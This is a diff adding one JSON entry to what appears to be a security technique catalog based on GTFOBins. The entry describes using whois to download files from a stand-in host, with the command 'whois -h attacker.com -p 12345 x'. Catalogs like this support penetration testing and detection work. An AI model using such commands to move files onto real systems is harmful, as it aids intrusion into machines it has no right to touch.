@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-whois-download",
+  "name": "GTFOBins · whois (download)",
+  "command": "whois -h attacker.com -p 12345 x",
+  "description": "Use whois to download via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "whois",
+    "download"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/whois/#download",
+  "upstream_id": "whois/download/0",
+  "category": "gtfobins",
+  "subcategory": "file-download",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/whois/"
+    }
+  ]
+}
